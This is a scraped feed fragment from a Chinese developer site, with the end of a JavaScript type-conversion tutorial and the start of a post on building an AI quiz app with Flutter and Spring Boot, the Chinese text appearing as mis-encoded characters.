<span class="hljs-built_in">String</span>(new Date());    <span class="hljs-comment">// æ—¥æœŸå­—ç¬¦ä¸²ï¼ˆå¦‚'Thu Nov 09 2023...'ï¼‰</span>
</code></pre>
<h2 data-id="heading-12">toString()æ–¹æ³•çš„è¡Œä¸º</h2>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// å¯¹è±¡çš„toString()æ–¹æ³•</span>
{}<span class="hljs-selector-class">.toString</span>();                <span class="hljs-comment">// '[object Object]'</span>

<span class="hljs-comment">// æ•°ç»„çš„toString()æ–¹æ³•</span>
<span class="hljs-selector-attr">[1, 2, 3]</span><span class="hljs-selector-class">.toString</span>();        <span class="hljs-comment">// '1,2,3'</span>
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.toString</span>();               <span class="hljs-comment">// ''</span>

<span class="hljs-comment">// å…¶ä»–ç±»å‹çš„toString()</span>
(<span class="hljs-number">123</span>)<span class="hljs-selector-class">.toString</span>();            <span class="hljs-comment">// '123'</span>
(true)<span class="hljs-selector-class">.toString</span>();           <span class="hljs-comment">// 'true'</span>

<span class="hljs-comment">// nullå’Œundefinedæ²¡æœ‰toString()æ–¹æ³•</span>
null<span class="hljs-selector-class">.toString</span>();             <span class="hljs-comment">// TypeError</span>
undefined<span class="hljs-selector-class">.toString</span>();        <span class="hljs-comment">// TypeError</span>
</code></pre>
<h2 data-id="heading-13">ä»€ä¹ˆæƒ…å†µä¸‹ä¼šå‘ç”Ÿéšå¼ç±»å‹è½¬æ¢</h2>
<ol>
<li>å››åˆ™è¿ç®— + - * % /</li>
<li>åˆ¤æ–­è¯­å¥ if while == &gt;=  &lt;=  &gt;  &lt;  !=</li>
</ol>
<h2 data-id="heading-14">åŠ æ³•è¿ç®—ç¬¦çš„è¯¦ç»†è§„åˆ™</h2>
<h3 data-id="heading-15">ä½œä¸ºä¸€å…ƒè¿ç®—ç¬¦ï¼ˆæ­£å·ï¼‰</h3>
<pre><code class="hljs language-arduino" lang="arduino">+ <span class="hljs-string">'123'</span>;        <span class="hljs-comment">// 123</span>
+ <span class="hljs-literal">true</span>;         <span class="hljs-comment">// 1</span>
+ <span class="hljs-literal">false</span>;        <span class="hljs-comment">// 0</span>
</code></pre>
<h3 data-id="heading-16">ä½œä¸ºäºŒå…ƒè¿ç®—ç¬¦ï¼ˆåŠ æ³•ï¼‰</h3>
<p>è§„åˆ™ï¼š</p>
<ol>
<li>å°†ä¸¤ä¸ªæ“ä½œæ•°è½¬æ¢ä¸ºåŸå§‹å€¼ï¼ˆToPrimitiveï¼‰</li>
<li>å¦‚æœä»»ä¸€æ“ä½œæ•°æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥</li>
<li>å¦åˆ™ï¼Œå°†ä¸¤ä¸ªæ“ä½œæ•°è½¬æ¢ä¸ºæ•°å­—è¿›è¡ŒåŠ æ³•è¿ç®—</li>
</ol>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-number">1</span> + <span class="hljs-number">2</span>;          <span class="hljs-regexp">//</span> <span class="hljs-number">3</span>ï¼ˆæ•°å­—ç›¸åŠ ï¼‰
<span class="hljs-number">1</span> + <span class="hljs-string">'2'</span>;        <span class="hljs-regexp">//</span> <span class="hljs-string">'12'</span>ï¼ˆå­—ç¬¦ä¸²æ‹¼æ¥ï¼‰
<span class="hljs-literal">true</span> + <span class="hljs-literal">false</span>;   <span class="hljs-regexp">//</span> <span class="hljs-number">1</span>ï¼ˆ<span class="hljs-number">1</span> + <span class="hljs-number">0</span>ï¼‰
[] + [];        <span class="hljs-regexp">//</span> <span class="hljs-string">''</span>ï¼ˆç©ºå­—ç¬¦ä¸² + ç©ºå­—ç¬¦ä¸²ï¼‰
[] + {};        <span class="hljs-regexp">//</span> <span class="hljs-string">'[object Object]'</span>
</code></pre>
<h2 data-id="heading-17">æ€»ç»“</h2>
<p>ç†è§£JavaScriptçš„ç±»å‹è½¬æ¢æœºåˆ¶å¯¹äºç¼–å†™å¥å£®çš„ä»£ç è‡³å…³é‡è¦ï¼š</p>
<ol>
<li><strong>æ˜¾å¼è½¬æ¢</strong>æä¾›äº†æ¸…æ™°ã€å¯é¢„æµ‹çš„ç±»å‹è½¬æ¢æ–¹å¼</li>
<li><strong>éšå¼è½¬æ¢</strong>è™½ç„¶æ–¹ä¾¿ï¼Œä½†å¯èƒ½å¼•å…¥éš¾ä»¥å‘ç°çš„bug</li>
<li>æŒæ¡è½¬æ¢è§„åˆ™å¯ä»¥å¸®åŠ©ä½ æ›´å¥½åœ°ç†è§£å’Œè°ƒè¯•ä»£ç </li>
<li>åœ¨å…³é”®ä¸šåŠ¡é€»è¾‘ä¸­ï¼Œæ¨èä½¿ç”¨æ˜¾å¼è½¬æ¢ä»¥æé«˜ä»£ç çš„æ¸…æ™°åº¦å’Œå¯é æ€§</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¬è¯´ä½ æ¯•ä¸šå¾ˆå¤šå¹´äº†ï¼Ÿé‚£ä¹ˆæ¥åšé¢˜å§ğŸ¦¶]]></title>    <link>https://juejin.cn/post/7581667332306419750</link>    <guid>https://juejin.cn/post/7581667332306419750</guid>    <pubDate>2025-12-09T09:06:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581667332306419750" data-draft-id="7576476897949843483" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¬è¯´ä½ æ¯•ä¸šå¾ˆå¤šå¹´äº†ï¼Ÿé‚£ä¹ˆæ¥åšé¢˜å§ğŸ¦¶"/> <meta itemprop="keywords" content="Flutter,iOS,APP"/> <meta itemprop="datePublished" content="2025-12-09T09:06:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="_å¤§å­¦ç‰²"/> <meta itemprop="url" content="https://juejin.cn/user/3125273628517148"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¬è¯´ä½ æ¯•ä¸šå¾ˆå¤šå¹´äº†ï¼Ÿé‚£ä¹ˆæ¥åšé¢˜å§ğŸ¦¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3125273628517148/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    _å¤§å­¦ç‰²
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:06:46.000Z" title="Tue Dec 09 2025 09:06:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">åºè¨€</h2>
<p align="center"> 
           <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/942f89459c6343039107e56fe7205591~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=K6GKWvQixQk14aoqejKcz9SFFDY%3D" width="100%" loading="lazy"/>
</p>
<p>è‡ªåˆ«å­¦å®«ï¼Œå²æœˆå¦‚ç‹—ï¼Œæ’’è…¿ç‹‚å¥”ï¼Œä¸çŸ¥æ˜”æ—¥å­¦æ¸£ä»Šä½•åœ¨ï¼Ÿ<br/>
å·¦æŒé”®ç›˜ï¼Œå³æé¼ æ ‡ï¼Œå¾®ä»°å…¶é¦–ï¼Œç«Ÿåœ¨å±å¹•é•œä¸­æ˜¾å®¹é¢œï¼<br/>
å¿ƒä¸­å¾®å¹ï¼Œæ›¾å‡ ä½•æ—¶ï¼Œæç¬”æ€é¢˜ï¼ŒçŠ¹å¦‚å¤©ä¸Šäººé—´å¤ªå²ç¥ã€‚<br/>
çŸ¥ä½ æƒ³å¿µï¼Œæ•…æ­¤ä»Šæ—¥ï¼Œé„™äººä¸æ‰ï¼Œå‡ºé¢˜å°ä¾ ç™»åœºçŒ®ä¸‘äº†ã€‚</p>
<h2 data-id="heading-1">èµ·å› </h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54a60e42c3e04f548562c7191a3f8e7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=5lYjPp9vnUiU1f%2ByXE1OImQ5DGE%3D" alt="æˆªå±2025-12-09 14.33.41.png" loading="lazy"/>
åœ¨è¿™ä¸€ç¯‡ã€Š<a href="https://juejin.cn/post/7569827641482674214**" target="_blank" title="https://juejin.cn/post/7569827641482674214**">ä» 0 åˆ°ä¸Šæ¶ï¼šç”¨ Flutter ä¸€å¤©åšä¸€æ¬¾åŠŸå¾·æœ¨é±¼</a>ã€‹æ–‡ç« ä¸­ï¼Œæˆ‘çš„ <code>æœ¨é±¼APP</code> æœ€ç»ˆé™¨è½äº†ï¼Œç©¶å…¶åŸå› å°±æ˜¯è¿™ç§ <strong>APP åœ¨ ï£¿ å•†åº—ä¸­å¤ª<code>å¤š</code>äº†</strong>,å¦‚æœä½ è¦æƒ³æˆåŠŸä¸Šæ¶ï¼Œæ— å¼‚äºè¦è„±èƒæ¢éª¨ã€‚</p>
<blockquote>
<p>åé¢æœ‰æ—¶é—´äº†ï¼Œæˆ‘æ‰“ç®—å°†å…¶é‡é“¸ä¸º <code>ä¿®ä»™æ•²æœ¨é±¼</code>ï¼Œé€šè¿‡ç§¯æ”’é±¼åŠ›ï¼Œçªç ´ç§©åºæ·é”ï¼Œæˆå°± <code>æ— ä¸Šæœ¨é±¼å¤§é“</code>ã€‚</p>
</blockquote>
<hr/>
<p>å› æ­¤ï¼Œæˆ‘å¸å–å¤±è´¥çš„æ•™è®­ï¼Œç€åŠ›äºå¼€å‘ä¸€æ¬¾æ¯”è¾ƒ <strong>ç‹¬ç‰¹çš„APP</strong> ï¼Œç»“åˆè¿™ä¸ªAIå¤§æ—¶ä»£çš„èƒŒæ™¯ï¼Œè¿™æ¬¾AIæ™ºèƒ½ <code>å‡ºé¢˜ä¾ </code> å°±åº”è¿è€Œç”Ÿäº†ã€‚æœ€åæ€»ç®—æ˜¯ä¸è¾œè´Ÿæˆ‘çš„åŠªåŠ›ï¼ŒæˆåŠŸä¸Šæ¶äº†ã€‚<br/>
æ¥ä¸‹æ¥å°±å‘å¤§å®¶è¯´è¯´ <strong>å®ƒçš„æ•…äº‹</strong> å§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c4b26dcfe204c65b350ce9987cd5225~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=DkLeKY6Brtcb6PCa%2FbDlbzNVa%2Bk%3D" alt="æˆªå±2025-12-09 14.44.38.png" loading="lazy"/></p>
<h2 data-id="heading-2">å®è·µ</h2>
<h3 data-id="heading-3">ä¸€. å‡†å¤‡é˜¶æ®µ</h3>
<h4 data-id="heading-4">1.æµç¨‹è®¾è®¡</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD

  %% å¯åŠ¨ä¸ç™»å½•
  A[å¯åŠ¨é¡µ] --&gt; B[æ— æ„Ÿç™»å½•]
  B --&gt; C[è¿›å…¥å¯¼èˆªé¡µ]

  %% ä¸»å£³å¯¼èˆª
  C --&gt; H[é¦–é¡µ]
  C --&gt; R[è®°å½•]
  C --&gt; T[ç»Ÿè®¡]
  C --&gt; P[æˆ‘çš„]

  %% é¦–é¡µå‡ºé¢˜ â†’ è®°å½•
  H --&gt; H1[è¾“å…¥ä¸»é¢˜/é«˜çº§è®¾ç½®]
  H1 --&gt; H2[ç”Ÿæˆé¢˜ç›®]
  H2 --&gt; H3[æç¤ºåå°ç”Ÿæˆ]
  H3 --&gt; R

  %% è®°å½• â†’ ç­”é¢˜/è¯¦æƒ…
  R --&gt; R1{è®°å½•çŠ¶æ€}
  R1 --&gt;|è¿›è¡Œä¸­| Q[è¿›å…¥ç­”é¢˜é¡µ]
  R1 --&gt;|å·²å®Œæˆ| RD[è®°å½•è¯¦æƒ…]
  RD --&gt; E[ç§’æ‡‚ç™¾ç§‘]

  %% ç­”é¢˜æµç¨‹
  Q --&gt; Q1[ä½œç­” / æäº¤]
  Q1 --&gt; Q2[ä¿å­˜æˆç»©]
  Q2 --&gt; R

  %% ç»Ÿè®¡é¡µ
  T --&gt; T1[åˆ·æ–°ç»Ÿè®¡æ•°æ®]

  %% æˆ‘çš„é¡µ
  P --&gt; P1[è®¾ç½®/å…³äº]
  P --&gt; P2[éšç§æ”¿ç­–]
  P --&gt; P3[æ³¨é”€]
  P3 --&gt; |ç¡®è®¤å| P4[æ¸…é™¤ token / è¿”å›æœªç™»å½•çŠ¶æ€]
</code></pre>
<h4 data-id="heading-5">2. ç´ æè·å–</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d21a570874264b239883d5b0a00510a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=GOF65mijLQGlLIGqNL1ES2AIIBI%3D" alt="æˆªå±2025-12-09 15.22.28.png" loading="lazy"/></p>
<p>Appçš„ <strong>logo</strong> å’Œå…¶ä¸­çš„ <strong>æ’å›¾</strong>ï¼Œæˆ‘éƒ½æ˜¯ç”¨çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fexp.volcengine.com%2Fark%2Fvision%3Fmode%3Dvision%26model%3Ddoubao-seedream-4-5-251128%26modelId%3Ddoubao-seedream-4-0-250828%26tab%3DGenImage" target="_blank" title="https://exp.volcengine.com/ark/vision?mode=vision&amp;model=doubao-seedream-4-5-251128&amp;modelId=doubao-seedream-4-0-250828&amp;tab=GenImage" ref="nofollow noopener noreferrer">Doubao-Seedream-4.0</a> ç”Ÿæˆçš„ï¼Œä¸€æ¬¡æ•ˆæœä¸è¡Œå°±å¤šç”Ÿæˆå‡ æ¬¡ï¼Œæœ€ç»ˆè¿˜æ˜¯èƒ½å¾—åˆ°ç›¸å¯¹æ»¡æ„çš„ç»“æœã€‚</p>
<p>åˆ°æˆ‘å†™æ–‡ç« çš„æ—¶å€™ï¼Œå·²ç»æœ‰äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fexp.volcengine.com%2Fark%2Fvision%3Fmode%3Dvision%26model%3Ddoubao-seedream-4-5-251128%26modelId%3Ddoubao-seedream-4-5-251128" target="_blank" title="https://exp.volcengine.com/ark/vision?mode=vision&amp;model=doubao-seedream-4-5-251128&amp;modelId=doubao-seedream-4-5-251128" ref="nofollow noopener noreferrer">Doubao-Seedream-4.5</a>ï¼Œå¤§å®¶å¯ä»¥å»ä½“éªŒä½“éªŒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/854bab81f9df4433bec4cb8baa49d114~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=GZoSRwDPddWhgOEKajWEzWKzSfk%3D" alt="æˆªå±2025-12-09 15.27.20.png" loading="lazy"/></p>
<h3 data-id="heading-6">äºŒ. å¼€å‘é˜¶æ®µ</h3>
<h4 data-id="heading-7">1. å‰ç«¯</h4>
<p>å‰ç«¯æ¯«æ— äº‰è®®çš„ä½¿ç”¨çš„æ˜¯ <code>Flutter</code>ï¼Œæ¯•ç«Ÿè¦æ˜¯ä»¥åå‘è¡Œ <code>Android</code> ä¹Ÿæ˜¯éå¸¸æ–¹ä¾¿çš„,æ— éœ€é‡æ–°å¼€å‘ã€‚å†ç»“åˆ <code>Trae</code>,æˆ‘åªéœ€è¦åœ¨å£å¤´ä¸ŠæŒ‡ç‚¹æŒ‡ç‚¹ï¼Œé‚£æ˜¯å¼€å‘çš„åˆå¿«åˆç¨³ï¼Œéå¸¸çš„è½»æ¾åŠ æ„‰å¿«ã€‚</p>
<blockquote>
<p>æ— é¡»å¤šè¨€ï¼Œè¿™å°±æ˜¯èµ›åšå£å—¨ç¨‹åºå‘˜ï¼ğŸ«¡</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1bda83073ca4e0b97c0c6f58936981b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=LM8SkJg3y4JvCvK1bBk9GVRho%2BM%3D" alt="æˆªå±2025-12-09 15.44.31.png" loading="lazy"/></p>
<h4 data-id="heading-8">2. åç«¯</h4>
<p>åç«¯å°±æ˜¯ï¼Œä¸–ç•Œä¸Šæœ€å¥½çš„ç¼–ç¨‹è¯­è¨€ <code>JAVA</code> äº†ï¼Œæ¯•ç«Ÿ <code>SpringBoot</code> å¯å¤ªé¦™äº†,æˆ‘ä¹Ÿæ˜¯äº²è‡ªä¸Šæ‰‹ã€‚</p>
<h5 data-id="heading-9">2.1 ä¾èµ–æ¦‚è§ˆ</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- âœ… æ ¸å¿ƒ LangChain4j ä¾èµ– --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>dev.langchain4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>langchain4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${langchain4j.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.squareup.okhttp3<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>okhttp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- Validation --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-validation<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- Spring Aop --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-aop<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- HuTool --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.hutool<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hutool-all<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${hutool.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- MyBatis-Plus --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-spring-boot3-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${mybatis-plus.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- MyBatis --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
